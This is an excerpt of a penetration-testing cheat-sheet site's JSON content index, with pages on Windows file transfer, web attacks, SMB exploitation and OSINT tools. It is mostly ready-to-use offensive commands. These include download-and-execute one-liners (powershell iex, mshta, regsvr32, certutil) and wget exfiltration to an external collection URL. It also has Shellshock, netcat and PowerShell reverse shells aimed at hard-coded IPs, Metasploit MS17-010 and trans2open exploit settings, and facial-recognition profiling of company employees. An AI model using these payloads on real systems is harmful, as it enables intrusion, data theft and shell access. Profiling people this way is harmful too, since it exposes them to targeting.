	"content": " Banner Grabbing # Using telnet telnet IP 119 # Using netcat nc -nv IP 119 LIST \nIdentification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_name to display related messages POST From; test@knacki.fr Newsgroups: group_name Subject: Test This is a test. . HEAD identity_article ARTICLE identity_article BODY identity_article"
},
{
	"uri": "/windows-systems/exploitation/file_transfer/",
	"title": "File Transfer",
	"tags": [],
	"description": "",
	"content": " /etc/init.d/pure-ftpd \nSMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\\\KALI_IP (Should display the SHARE_NAME) dir \\\\KALI_IP\\SHARE_NAME copy \\\\KALI_IP\\SHARE_NAME\\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwords \nBuild a FTP and transfer file # Set up a ftp downloading script on the target machine: echo open IP 21 \u0026gt; ftp.txt echo USER acknak\u0026gt;\u0026gt; ftp.txt echo jLQRZy4gyLhmMqz2whTw\u0026gt;\u0026gt; ftp.txt echo ftp \u0026gt;\u0026gt; ftp.txt echo bin \u0026gt;\u0026gt; ftp.txt echo GET wget.exe \u0026gt;\u0026gt; ftp.txt echo bye \u0026gt;\u0026gt; ftp.txt # Download the prepared file: ftp -v -n -s:ftp.txt # Start tftp server on Kali aftpd start # Transfer files from Kali to Windows (from windows terminal) tftp -I IPADDRESS GET nameoffile.exe # You can have a shell using this echo open \u0026lt;attacker_ip\u0026gt; 21\u0026gt; ftp.txt echo USER offsec\u0026gt;\u0026gt; ftp.txt echo ftp\u0026gt;\u0026gt; ftp.txt echo bin \u0026gt;\u0026gt; ftp.txt echo GET nc.exe \u0026gt;\u0026gt; ftp.txt echo bye \u0026gt;\u0026gt; ftp.txt ftp -v -n -s:ftp.txt nc.exe \u0026lt;attacker_ip\u0026gt; 1234 -e cmd.exe \nDownloading # Execute file from a WebDav server: cscript //E:jscript \\\\IP\\folder\\payload.txt # Download using wget.vbs cscript wget.vbs http://IP/file.exe file.exe # One liner download file from WebServer: powershell -exec bypass -c \u0026#34;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(\u0026#39;http://webserver/payload.ps1\u0026#39;)|iex\u0026#34; powershell -exec bypass -c \u0026#34;(new-object System.Net.WebClient).DownloadFile(\u0026#39;http://IP/file.exe\u0026#39;,\u0026#39;C:\\Users\\user\\Desktop\\file.exe\u0026#39;)\u0026#34; # Download from WebDAV Server: powershell -exec bypass -f \\\\IP\\folder\\payload.ps1 \nUsing File echo $storageDir = $pwd \u0026gt; wget.ps1 echo $webclient = New-Object System.Net.WebClient \u0026gt;\u0026gt;wget.ps1 echo $url = \u0026#34;http://10.10.14.11/Dropper/Windows/shell.exe\u0026#34; \u0026gt;\u0026gt;wget.ps1 echo $file = \u0026#34;shell.exe\u0026#34; \u0026gt;\u0026gt;wget.ps1 echo $webclient.DownloadFile($url,$file) \u0026gt;\u0026gt;wget.ps1 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 \nDownloading and Execution # Method 1 mshta vbscript:Close(Execute(\u0026#34;GetObject(\u0026#34;\u0026#34;script:http://IP/payload.sct\u0026#34;\u0026#34;)\u0026#34;)) # Method 2 mshta http://IP/payload.hta # Method 3 (Using WebDav) mshta \\\\IP\\payload.hta #Download and execute XSL using wmic wmic os get /format:\u0026#34;https://webserver/payload.xsl\u0026#34; # Download and execute over a WebServer: regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll # Using WebDAV regsvr32 /u /n /s /i:\\\\webdavserver\\folder\\payload.sct scrobj.dll \nMultiple ways using certutil # Multiple ways to download and execute files: certutil -urlcache -split -f http://webserver/payload payload # Execute a specific .dll: certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 \u0026amp; certutil -decode payload.b64 payload.dll \u0026amp; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil /logfile= /LogToConsole=false /u payload.dll # Execute an .exe: certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 \u0026amp; certutil -decode payload.b64 payload.exe \u0026amp; payload.exe \nTips for non-interactive shell using nc # In a case of a non-interactive shell, you can transfer up to 64k of memory # You can increase that size by compressing the willing file (let\u0026#39;s say nc.exe) using: upx -9 nc.exe # nc.exe has now been compressed but remains functional # Now convert it to text instructions using exe2bat wine exe2bat.exe nc.exe nc.txt # Then copy paste the content of nc.txt to the remote shell ! # You\u0026#39;ll get a proper nc.exe using debug.exe from the target !"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/social-networks/general_misc/",
	"title": "General - MISC - Multi",
	"tags": [],
	"description": "",
	"content": " Tips \u0026amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php \nSocialBlade # Socialblade is an online tool where you can see and analyze Youtube, Instagram, Twitch, Twitter or Dailymotion accounts https://socialblade.com/twitter/user/***REMOVED*** \nYoutube # Yasiv is an online tool allowing to map links and relations between Youtube videos https://yasiv.com/ https://yasiv.com/youtube#?q=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DQWG5vDSiCHQ \nReaper # Reaper is a Windows GUI tool that scrapes (download) data from social media through their API # It supports several platforms : Facebook, Twitter, Reddit, Youtube, Pinterest, Tumblr # All data will be saved in a excel output format # The official website gives informations on how to set up different services https://reaper.social/ # Facebook (https://reaper.social/platforms/facebook.html) # Public and private data # The Graph API gives public access to some useful data such as the posts and comments made on public facebook pages. # Page, Group and Event administrators have access to more information such as statistics, and identifying informaton # for user’s posts, comments and reactions. If you want to access this private data you can request an access token from an administrator. \nSocial Mapper General Informations # Social Mapper is a tool that correlates profiles via facial recogniton https://github.com/SpiderLabs/social_mapper # It supports the following social networks : LinkedIn, Facebook, Twitter, GooglePlus, Instagram, VKontakte, Weibo, Douban # It can takes a variety of input # Organisation name → Searching via LinkedIn # A folder full of named images # A CSV file with names and URL\u0026#39;s to images online Getting Started # A quick run for facebook and twitter on some targets you have in an imagefolder, that you plan to manually review and don\u0026#39;t mind some false positives: python social_mapper.py -f imagefolder -i ./mytargets -m fast -fb -tw # A exhaustive run on a large company where false positives must be kept to a minimum python social_mapper.py -f company -i \u0026#34;SpiderLabs\u0026#34; -m accurate -a -t strict # A large run that needs to be split over multiple sessions due to time, the first run doing LinkedIn and Facebook, with the second resuming and # filling in Twitter, Google Plus and Instagram python social_mapper.py -f company -i \u0026#34;SpiderLabs\u0026#34; -m accurate -li -fb python social_mapper.py -f socialmapper -i ./SpiderLabs-social-mapper-linkedin-facebook.html -m accurate -tw -gp -ig # A quick run (~5min) without facial recognition to generate a CSV full of names,email addresses,profiles and photo # links from up to 1000 people pulled out of a LinkedIn company, where the email format is known to be \u0026#34;firstname.lastname\u0026#34;. python social_mapper.py -f company -i \u0026#34;SpiderLabs\u0026#34; -m accurate -li -e \u0026#34;\u0026lt;first\u0026gt;.\u0026lt;last\u0026gt;@spiderlabs.com\u0026#34;"
},
{
	"uri": "/linux-systems/",
	"title": "Linux Systems",
	"tags": [],
	"description": "",
	"content": " Table of Content  Recon and Enumeration File Transfer Privilege Escalation  System Tricks Services Abusing sudo programs  Programing Languages  Bash Python Perl   "
},
{
	"uri": "/web-attacks/misc_others/",
	"title": "MISC &amp; Others",
	"tags": [],
	"description": "",
	"content": " Table of Content  MISC Hidden Parameters Apache Server Status Command Injection Server Side Template Injection (SSTI) Image Tragick Shellshock Heartbleed  \nMISC # Install files # You can check for backup files using the following extensions .backup, .bck, .old, .save, .bak, .sav, ~, .copy, .old, .orig, .tmp, .txt, .back, .bkp, .bac, .tar, .gz, .tar.gz, .zip, .rar # Check headers # They often give informations curl -v \u0026lt;target\u0026gt; # Test for others HTTP methods (verb tampering) # Bypass .htaccess curl -X COUCOU \u0026lt;target\u0026gt; # CRLF ‘ ’ = %20 CR = %0D LF = %0A # Spring Boot / Metrics /metrics → Endpoint showing tons of endpoints /heapdump → Get a memory dump of the application Exploit → jhat -port 7401 -J-Xmx4G heapdump2016-12-27-13-54-live2196484565712626494.hprof # CMSimple LFI index.php ?sl=../adm\u0026amp;file=config\u0026amp;action=download\u0026amp;adm=1 # Extract endpoint from JS files (https://github.com/jobertabma/relative-url-extractor) ruby extract.rb https://hackerone.com/some-file.js # Look for vhost on a target (https://github.com/jobertabma/virtual-host-discovery) ruby scan.rb --ip=192.168.1.101 --host=domain.tld # Unicode char can cause breaks in some applications # Exemple with the pile of poo https://emojipedia.org/pile-of-poo/ 💩 # Check for following files # The cwd (current working directory) could be used to access some files like /cwd/path/to/file /proc/self/environ /proc/self/cmdline /proc/self/cwd \nHidden parameters # Sometimes hidden parameters are set on pages # You can use tools like Arjun to find them (https://github.com/s0md3v/Arjun) python3 arjun.py -u https://api.example.com/endpoint --get # Multi threading python3 arjun.py -u https://api.example.com/endpoint --get -t 22 # Delay between requests python3 arjun.py -u https://api.example.com/endpoint --get -d  \nApache Server Status # Apache server-status is an Apache monitoring instance # Available by default at http://example.com/server-status. # In normal cases, the server-status instance is not accessible by non-local IPs. # However, due to misconfiguration, it can be publicly accessible. # This leads anyone to view the great amount of data by server-status. # Data exposed : # - All URL requested by all hosts/vhosts, including obscure files/directories and session tokens # - All requested client\u0026#39;s IPs # Monitoring and exploiting Server Status https://github.com/mazen160/server-status_PWN python server-status_PWN.py --url \u0026#39;http://example.com/server-status\u0026#39; \nCommand Injection # Command Injection blablabla ; ls # Example : command injection v1 Root-Me 127.0.0.1 ; ls # Bypass filters - syntax error \u0026#39;\u0026#39; OK \u0026#39;127.0.0.1\u0026#39; OK () syntax error `ls` syntax error (car ` filtré donc `ls` =\u0026gt; ls) `;` OK 127.|0.0.1 OK =\u0026gt; | filtré 127.0.\u0026amp;0.1 OK =\u0026gt; \u0026amp; filtré 127.0.;0.1 OK =\u0026gt; ; filtré 127.0.$0.1 OK =\u0026gt; $ filtré 127.0.`0.1 OK =\u0026gt; ` filtré 127.0.``0.1 OK =\u0026gt; ` filtré 127.0.\u0026#39;0.1 syntax error =\u0026gt; \u0026#39; pas filtré 127.0.\u0026#39;\u0026#39;0.1 OK =\u0026gt; \u0026#39;\u0026#39; string vide donc sans effet 192.198.169.198 NOK 127.0.0.1 127.0.0.1 NOK =\u0026gt; comme sur un host normal, donc espaces acceptés 127 .0.0.1 syntax error =\u0026gt; confirme espace OK #127.0.0.1 syntax error 127.0.0.1 #127.0.0.1 OK =\u0026gt; # pas filtré 127.0.0.1 -L OK 127.0.0.1 -c 1 syntax error 127.0.0.1 -i 10 OK, long time (\u0026gt;20s) donc argument pris en compte 127.0.0.1%0asleep 20 longue attente (20s + ~3), donc commande probablement exécutée après # You can then use wget and --post-file option to exfiltrate data 127.0.0.1%0awget%20--post-file%20index.php%20https://hookb.in/xxxxxx # Or you can use nc to get a reverse shell nc -lvvp 4444 curl \u0026lt;target/index.php\u0026gt; --data \u0026#39;ip=`www.google.fr%0anc.traditional MON_IP 4444 -e /bin/bash`\u0026#39; \nServer Side Template Injection # You can use tools like tplmap ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d \u0026#34;nickname=john\u0026#34; ./tplmap.py -u http://challenge01.root-me.org/web-serveur/ch41/check -d \u0026#34;nickname=john\u0026#34; --os-shell # Freemarker command execution \u0026lt;#assign ex=\u0026#34;freemarker.template.utility.Execute\u0026#34;?new()\u0026gt; ${ ex(\u0026#34;cmd\u0026#34;) } \nImagick - CVE-2016-3718 - SSRF Dans un .svg push graphic-context viewbox 0 0 640 480 fill \u0026#39;url(https://example.com/image.jpg\u0026#34;|nc -l -p 7777 -e\u0026#34;/bin/sh)\u0026#39; pop graphic-context \nShellshock - CVE-2014-6271 Apache mod_cgi or any CGI information ? Could be vulnerable to shellshock # Shellshock == CVE-2014-6271 # Classic PoC curl -H \u0026#34;User-Agent: () { :; }; /bin/command\u0026#34; http://example.com/ () {:;}; /bin/cat /etc/passwd # Reverse shell () { :; }; /bin/sh -c /bin/sh -i \u0026gt;\u0026amp; /dev/tcp/139.99.169.198/51337 0\u0026gt;\u0026amp;1 \u0026amp; # Reverse Shell curl -H \u0026#34;User-Agent: () { :;};echo content-type:text/plain;echo;/bin/nc 51.75.29.235 2222 -e /bin/bash;echo;exit\u0026#34; http://vuln.com/script.cgi # Automatic tool : shellshocker.py https://github.com/liamim/shellshocker \nHeartbleed - CVE-2014-0160 # Some github repository provides functionnal PoC https://github.com/mpgn/heartbleed-PoC # Exploit using MetaSploit \u0026gt; use auxiliary/scanner/ssl/openssl_heartbleed \u0026gt; set RHOSTS 51.75.202.113:1073 \u0026gt; set RPORT 1073 \u0026gt; set TLS_VERSION 1.2 # Note - Ne pas oublier de modifier la verbosité afin de récupérer les données \u0026gt; set verbose true \u0026gt; exploit"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/photon/",
	"title": "Photon",
	"tags": [],
	"description": "",
	"content": " General Informations # Photon is a fast OSINT web crawler which can retrieve the following data for a target : # URLs (in-scope \u0026amp; out-of-scope) # URLs with parameters (example.com/gallery.php?id=2) # Intel (emails, social media accounts, amazon buckets etc.) # Files (pdf, png, xml etc.) # Secret keys (auth/API keys \u0026amp; hashes) # JavaScript files \u0026amp; Endpoints present in them # Strings matching custom regex pattern # Subdomains \u0026amp; DNS related data # You can use the --ninja 4 option to get 4 clients requesting server. It can give a speed boost. # Under heavily development, the --update option is designed to check updates. \nCommands # Crawl a single website python photon.py -u \u0026#34;http://example.com\u0026#34; # Clone the website locally python photon.py -u \u0026#34;http://example.com\u0026#34; --clone # Output + verbose python photon.py -u \u0026#34;http://example.com\u0026#34; -o \u0026#34;mydir\u0026#34; -v python photon.py -u \u0026#34;http://example.com\u0026#34; --export=json # fetch archived URLs from archive.org (only last year results) python photon.py -u \u0026#34;http://example.com\u0026#34; --wayback # No data extraction python photon.py -u \u0026#34;http://example.com\u0026#34; --only-urls # Using other websites for requests (developer.facebook.com, codebeautify.org, photopea.com, pxlr.com) python photon.py -u \u0026#34;http://example.com\u0026#34; --ninja 4 # Dumping dns data for subdomains python photon.py -u http://example.com --dns"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/recondog/",
	"title": "ReconDog",
	"tags": [],
	"description": "",
	"content": " General Informations # Recon Dog is an all in one tool for all your basic information gathering needs. # It uses APIs to gather all the information so your identity is not exposed. # Simple and basic standalone python script # All informations seems to be extracted from API\u0026#39;s services, so it fully passive \nModules \u0026amp; Tools • Censys: uses censys.io to collect a large amount of information about an IP address • NS Lookup: Performs name server search • Port scan: Scans the most common TCP ports • Detect CMS: Can detect more than 400 content management systems • Whois Lookup: Performs whois protocol search • Detect honeypot: Uses Shodan to identify whether the target is a honeypot • Find subdomains: Search for sub-domains using com • Reverse IP Lookup: Does an inverse IP lookup to find domains associated with an IP address • Detect technologies: Uses wappalyzer.com to detect over a thousand technologies • All: According to experts in digital forensics, this utility executes all the previous utilities in the target"
},
{
	"uri": "/recon-enumeration/services-enumeration/135_rpc/",
	"title": "135 - RPC",
	"tags": [],
	"description": "",
	"content": " Resources http://attackerkb.com/Windows/rpcclient rpcclient # Anonymous connection (-N=no pass) rpcclient -U “” -N \u0026lt;ip\u0026gt; # Connection with user rpcclient -U “user” \u0026lt;ip\u0026gt; # Get information about the DC srvinfo # Get information about objects such as groups (enum*) enumdomains enumdomgroups enumalsgroups builtin # Try to get domain password policy getdompwinfo # Try to enumerate different truste domains dsr_enumtrustdom # Get username for a defined user ? getusername # Query user, group etc informations queryuser RID querygroupmem519 queryaliasmem builtin 0x220 # Query info policy lsaquery # Convert SID to names lookupsids SID \nenum4linux # Verbose mode enum4linux -v target-ip # Do everything enum4linux -a target-ip # List users enum4linux -U target-ip # If you\u0026#39;ve managed to obtain credentials, you can pull a full list of users regardless of the RestrictAnonymous option enum4linux -u administrator -p password -U target-ip # Get username from the defaut RID range (500-550, 1000-1050) enum4linux -r target-ip # Get username using a custom RID range enum4linux -R 600-660 target-ip # List groups enum4linux -G target-ip # List shares enum4linux -S target-ip # Perform a dictionary attack, if the server doesn\u0026#39;t let you retrieve a share list enum4linux -s shares.txt target-ip # Pulls OS information using smbclient, this can pull the service pack version on some versions of Windows enum4linux -o target-ip # Pull information about printers known to the remove device. enum4linux -i target-ip"
},
{
	"uri": "/web-attacks/burpsuite/",
	"title": "BurpSuite",
	"tags": [],
	"description": "",
	"content": "TODO\n"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/misc/",
	"title": "MISC",
	"tags": [],
	"description": "",
	"content": " Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.py /path/to/file.json \nWayback Machine (https://archive.org/web/) # You can also uses as CLI tool https://github.com/tomnomnom/waybackurls cat domains.txt | waybackurls \u0026gt; urls # Cache pages http://cachedview.com/ \nCode replication # You can find same website piece of code to identify same vendors https://nerdydata.com/search https://searchcode.com/ \nShort URL \u0026amp; Redirections # Get informations about a shortened link https://checkshorturl.com # Find where does redirection go http://redirectdetective.com/ # Get information directly from the creator (bitly for example # Add + at the the end (you can get creation date) https://bitly.com/lnkdarticles+ \nForums # Find informations on forums http://boardreader.com \nSearch the Darkweb https://medium.com/@darksearch/darksearch-the-1st-real-search-engine-dark-web-darksearch-vs-ahmia-84852fd4c51b https://darksearch.io/"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/osint-spy/",
	"title": "OSINT-SPY",
	"tags": [],
	"description": "",
	"content": " General Informations # Performs OSINT scan on email/domain/ip_address/organization using OSINT-SPY. # It can be used by Data Miners, Infosec Researchers, Penetration Testers and cyber crime # investigator in order to find deep information about their target. # Perform scan on IP Address / domain / email address / BTC(bitcoin) address / device # Find out latest bitcoin block information # List out all the ciphers supported by particular website and server # Check whether a particular website is vulnerable to heartbleed or not ? # Dump all the contacts and messages from skype database # Analyze malware or malicous file remotely # Don\u0026#39;t use the linux_install.py script, trash. go venv # API keys in modules/config.py file \nUsage # Options --ssl_cipher --ssl_bleed --domain --email --ip --device --skype_db --malware --btc_block --btc_date --btc_address --carrier --stego_text --stego_find # Get information about the cipher methods available in the SSL cert python osint-spy.py --ssl_cipher google.com # Check if a target is vulnerable to heartbleed (PASSIVE ?) python osint-spy.py --ssl_bleed haax.fr # Get overall information about one domain (whois, dns, ciphers, location, and more) (PASSIVE ???) python osint-spy.py --domain domaine.fr # Get information about one email (name, social network profiles etc...) # Very basic python osint-spy.py --email haax@haax.fr # Get information about an IP address (basic infos) # Host, country name, city, organization, ISP python osint-spy.py --ip xxx.xxx.xxx.xxx \nMISC # Search for specific device on shodan python osint-spy.py --device webcam # It will find out all the contacts and message history from given skype database. # In Windows,Skype database can be found in AppData\\Roaming\\Skype\\(Your username)\\main.db # In Mac OSX , database can be found in /Users/(Your mac user anme)/Library/Support/Skype/(your skyoe username)/main.db python osint-spy.py --skype_db main.db # It will send a given piece of file to virustotal and will give you a result whether given file is malware or not. python osint-spy.py --malware abc.exe # Get information about the last bitcoint block chain python osint-spy.py --btc_block # Get information about bitcoin blockchain for a given date python osint-spy.py --btc_date 20190420 # Get information about a particular wallet python osint-spy.py --btc_address 1DST3gm6JthxhuoNKFqXrdpzPFfz1WgHpW \nSteganography # Hide text inside an image python osint-spy.py --carrier receiver.png --stego_text “this is a secret text” # Try to find text behind an image # python osint-spy.py --stego_find hidden.jpg"
},
{
	"uri": "/other-systems/",
	"title": "Other Systems",
	"tags": [],
	"description": "",
	"content": " Table of Content  IPBX  "
},
{
	"uri": "/recon-enumeration/services-enumeration/139_445_smb/",
	"title": "139/445 - SMB",
	"tags": [],
	"description": "",
	"content": " General Informations SMB1 =\u0026gt; Win2000 / XP / 2003 SMB2.0 =\u0026gt; Vista / 2008 SMB2.1 =\u0026gt; Win7 / 2008R2 SMB3.0 =\u0026gt; Win8 / 2012 SMB 3.02 =\u0026gt; Win8.1 / 2012R2 # Configuration tips # Can be usefull to configure /etc/samba/smb.conf with: client min protocol = SMB2 client max protocol = SMB3 # Then service smbd restart \nIdentification # Port 139 # Using nbtscan to identify host/domain nbtscan IP (identifier le nom/domaine) # Identity SMB2 support using metasploit use auxiliary/scanner/smb/smb2 set RHOST IP run # Discover real samba version if hidden ngrep -i -d tap0 ‘s.?a.?m.?b.?a.*[[:digit:]]’ \u0026amp; smbclient -L //IP ### Services and Resources Scanning # Base nmap nmap -v --script=xxxx -p T:139,445 \u0026lt;IP\u0026gt; # Hard nmap nmap -n -sV --version-intensity=5 -sU -sS -Pn -p T:139,445,U:137 --script=xxx \u0026lt;IP\u0026gt; # SMB Relate NSE Scripts # Try to retrieve NetBIOS and MAC nbstat # Enum smb-enum-domains smb-enum-groups smb-enum-processes smb-enum-sessions smb-os-discovery smb-server-stats smb-system-info # Attempts to retrieve useful information about files shared on SMB volumes smb-ls # Queries information managed by the Windows Master Browser smb-mbenum # Try to print something smb-print-text # Get security level information about SMB smb-security-mode # Vulns smb-vuln-conficker (dangerous, can crash target) smb-vuln-ms06-025 (Buffer overflow in RRAS) smb-vuln-ms07-029 (Buffer overflow which can crash the RPC intrface in the DNS Server) smb-vuln-ms08-067 (Buffer overflow/RCE. Dangerous, can crash the target) smb-vuln-ms10-054 (Remote Memory Corruption. Result is BSOD -\u0026gt; DANGEROUS) smb-vuln-ms10-061 (Print vulnerability. Safe and can\\\u0026#39;t crash the target) smb-vuln-ms17-010 (RCE, just checking if vulnerable) \nEnumeration # Get NetBIOS from IP nmblookup -A \u0026lt;IP\u0026gt; # Enumeration using enum4linux enum4linux -a -R 500-600,950-1150 (identifier le nom/domaine + users + shares) # Smbclient # List shares smbclient -L //IP smbclient -L \u0026lt;ip\u0026gt; # Connect smbclient \\\\\\\\x.x.x.x\\\\share smbclient -U “DOMAINNAME\\Username” \\\\\\\\IP\\\\IPC$ password # Specify username and no pass smbclient -U “” -N \\\\\\\\IP\\\\IPC$ # Nullinux for users and shares nullinux -users -quick DC1.Domain.net nullinux -all 192.168.0.0-5 nullinux -shares -U \u0026#39;Domain\\User\u0026#39; -P \u0026#39;Password1\u0026#39; 10.0.0.1,10.0.0.5 # Smbmap for domains (List share drives, drive permissions, share contents, upload/download functionality..) # Basic enumeration (password or NTLM hash) python smbmap.py -u jsmith -p password1 -d workgroup -H 192.168.0.1 # Remote command execution python smbmap.py -u \u0026#39;apadmin\u0026#39; -p \u0026#39;asdf1234!\u0026#39; -d ACME -H 10.1.3.30 -x \u0026#39;net group \u0026#34;Domain Admins\u0026#34; /domain\u0026#39; # Non-recursive path listing python smbmap.py -H 172.16.0.24 -u Administrator -p \u0026#39;changeMe\u0026#39; -r \u0026#39;C$\\Users\u0026#39; # File content searching python smbmap.py --host-file ~/Desktop/smb-workstation-sml.txt -u NopSec -p \u0026#39;NopSec1234!\u0026#39; -d widgetworld -F \u0026#39;[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]\u0026#39; # Drive listing python smbmap.py -H 192.168.1.24 -u Administrator -p \u0026#39;R33nisP!nckle\u0026#39; -L # Nifty Shell python smbmap.py -u jsmith -p \u0026#39;R33nisP!nckle\u0026#39; -d ABC -H 192.168.2.50 -x \u0026#39;powershell -command \u0026#34;function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=\u0026#34;\u0026#34;\u0026#34;\u0026#34;1.1.1.1\u0026#34;\u0026#34;\u0026#34;\u0026#34;; $port=\u0026#34;\u0026#34;\u0026#34;\u0026#34;4445\u0026#34;\u0026#34;\u0026#34;\u0026#34;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize ;$p=New-Object System.Diagnostics.Process ;$p.StartInfo.FileName=\u0026#34;\u0026#34;\u0026#34;\u0026#34;cmd.exe\u0026#34;\u0026#34;\u0026#34;\u0026#34; ;$p.StartInfo.RedirectStandardInput=1 ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0 ;$p.Start() ;$is=$p.StandardInput ;$os=$p.StandardOutput ;Start-Sleep 1 ;$e=new-object System.Text.AsciiEncoding ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length) ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}} if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else { $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=\u0026#34;\u0026#34;\u0026#34;\u0026#34; \u0026#34;\u0026#34;\u0026#34;\u0026#34;}} $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};\u0026#34;\u0026#39; # Attackers nc -l 4445 \nMS17-010 Exploitation # Using metasploit (IMPORTANT MS17_010_PSEXEC is a staged payload, means you need meterpreter !) (IMPORTANT 2, if object can\\\u0026#39;t be found, try to modify your target !) use exploit/windows/smb/ms17_010_psexec set SHARE ADMIN$ set SMBDomain ALICE set ALLOW_GUEST true set LPORT 445 set LHOST 10.11.0.179 set RHOST 10.11.1.5 set TARGET 3 (TARGET 1 = PowerShell / TARGET 2 = Native / TARGET 3 = MOF =\u0026gt; besoin du share ADMIN$) set PAYLOAD windows/shell/reverse_tcp set VERBOSE true set DBGTRACE true set EXITFUNC thread exploit -j \nTrans2open Exploitation # Samba 2.2.X are usually vulnerable to trans2open # Using metasploit use exploit/linux/samba/trans2open set VERBOSE true set PAYLOAD linux/x86/shell_reverse_tcp set RHOST IP set LPORT 443 set LHOST IP exploit -j -z \nSamba 3.4.5 Symlink Directory Traversal # You can mount the root fiilesystem to a share you can access https://www.exploit-db.com/exploits/33599 # Using metasploit https://www.exploit-db.com/exploits/33598 use auxiliary/admin/smb/samba_symlink/traversal"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/",
	"title": "Belati",
	"tags": [],
	"description": "",
	"content": " General Informations # Belati is tool for Collecting Public Data \u0026amp; Public Document from Website and other service for OSINT purpose. # This tools is inspired by Foca and Datasploit for OSINT # Might need root privileges to executes all tools # Like nmap. But it works well without root (nmap won\u0026#39;t be executed) # Not totally passive as long as it does an HTTP Banner Grabbing for earch domain/subdomain found. \nUsage - Basic Commands # Display help \u0026gt; ? \u0026gt; help # Display necessary options for analysis \u0026gt; show options # You can then set your target domain \u0026gt; set domain domain.com # Start the crawling and research process \u0026gt; start \nStart - Actions # On the main domain - whois - HTTP Banner Grabbing - Subdomain enumeration (dnsdumpster, crt.sh) # Then for each subdomain - HTTP Banner Grabbing - Wappalyzing - Checking GIT/SVN repository # Then on each IP found it does nmap # If root is not set, it will skip this step (good to know) nmap -sS -A -Pn \u0026lt;IP\u0026gt; # Other steps - DNS Zone Scanning - Email harvest - Public document harvest (PDF, DOC, XLS, ODT, PPT, RTF, TXT) → Download them # Result / Report # It starts a web server on 127.0.0.1:8000"
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/frameworks-correlation/",
	"title": "Frameworks &amp; Correlation",
	"tags": [],
	"description": "",
	"content": " General thoughts about each framework or multitask tool    Tool Fully Passive Can be fully passive Individual commands Fully automated Thoughts Really Usable ?     Danger Zone Yes Yes No (not really) Almost Semi-Complete tool performing OSINT on 3 types of targets (domain, IP, email). Each type will then launch a bunch of tools and test to gather information Yes. It\u0026rsquo;s not fully exhaustive but can give some interesting informations   Gasmask Yes Yes Yes No Seems to be a complete tool but hard to use/learn. The command lien syntax looks hards Yes but need some practice to learn the syntax   Spiderfoot Not sure Probably not Not really but scans can be customised Yes Big and complete tool but it can bring many false positive. You still can analyse manually results. Scan are long (45min/1h) Yes but it can be hard sometimes   Datasploit No (wapp) Semi-Passive (browser like) No Almost Semi-complete and semi-passive tool. It will detect if IP, domain, username or phonenumber and perform some queries. You can specify quiet or active mode. Not totally passive, it acts like a web browser Probably yes. You can have good result but its not fully passive.   Recon-ng No Yes Yes (modules) No Big and complete tool but hard to use as long as you need to know modules Yes but need some practice to master modules   Omnibus No Yes Yes No Complete framework used to do many recon things. Individual commands so analysis can be fully passive. Features vocabulary is strange and need adapt Yes but need some practice to learn using session, modules etc   ReconDog Yes Yes No Yes Simple and basic recon, it only uses public API to gather informations Yes but informations won\u0026rsquo;t be enough   OSINT-SPY No Yes Yes No Simple tool, not veru exhaustive but can gather some informations about a target. Some functionnalties may be useless and some are buggy Hard to use as long as some outputs are broken and some features are basic (manually doable) or useless   Belati No No No Yes Automated script that does lots of manually doable things. Basic recon and not so passive. Not really. Benefits are not that good and it\u0026rsquo;s considered as active recon    \nTroubles / Nope Maltego (https://www.paterva.com/web7/downloads.php) → Still not installed → Wait and see Sn0int (https://sn0int.readthedocs.io/en/latest/index.html) → Install failed → module “nude” Intrigue-core (https://github.com/intrigueio/intrigue-core) → Not installed → Installation seemed hard compared to benefits PownRecon (https://github.com/pownjs/pown-recon) → NodeJS tool → Seemed to be focused on relations between people, not very efficient Inquisitor (https://github.com/penafieljlm/inquisitor) → Not installed → Not very efficient features"
},
{
	"uri": "/passcracking-hashfiles/",
	"title": "Passcracking Hash &amp; Files",
	"tags": [],
	"description": "",
